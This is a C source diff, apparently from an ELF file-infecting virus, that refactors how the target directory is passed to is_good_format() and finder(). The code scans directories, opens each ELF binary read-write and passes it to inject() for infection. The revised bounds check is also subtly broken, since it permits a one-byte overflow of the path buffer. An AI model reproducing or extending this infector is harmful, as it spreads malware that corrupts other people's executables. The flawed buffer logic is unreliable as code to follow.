@@ -16,22 +16,22 @@ int FORCE_INLINE signature_present(int fd)
 
 }
 
-int FORCE_INLINE is_good_format(char *filename)
+int FORCE_INLINE is_good_format(char *filename, char *infested_dir)
 {
 	char	buf[BUF_SIZE];
-	char	infested_dir[] = INFESTED_DIR;
 	char	elfmag[] = ELFMAG;
 	int	fd;
 	Elf64_Ehdr header;
 	size_t	name_size;
+	size_t dir_size;
 
-
+	dir_size = ft_strlen(infested_dir);
 	name_size = ft_strlen(filename);
-	if (name_size + sizeof(infested_dir) > BUF_SIZE)
+	if (name_size + dir_size - 1 > BUF_SIZE)
 		return (-1);
-	ft_memcpy(buf, infested_dir, sizeof(infested_dir) - 1);
-	ft_memcpy(buf + sizeof(infested_dir) - 1, filename, name_size);
-	buf[name_size + sizeof(infested_dir) - 1] = 0;
+	ft_memcpy(buf, infested_dir, dir_size);
+	ft_memcpy(buf + dir_size, filename, name_size);
+	buf[name_size + dir_size] = 0;
 	fd = OPEN(buf, O_RDWR);
 	if (fd < 0)
 		return (-1);
@@ -46,7 +46,7 @@ int FORCE_INLINE is_good_format(char *filename)
 	return (fd);
 }
 
-int finder(t_data data, int dir_fd)
+int finder(t_data data, int dir_fd, char *dir)
 {
 	int	nread;
 	int	bpos;
@@ -63,7 +63,7 @@ int finder(t_data data, int dir_fd)
 		{
 			d = (struct linux_dirent64*)(buf + bpos);
 			if (d->d_type == DT_REG &&
-					(data.fd = is_good_format(d->d_name)) != -1)
+					(data.fd = is_good_format(d->d_name, dir)) != -1)
 				inject(data);
 			bpos += d->d_reclen;
 		}
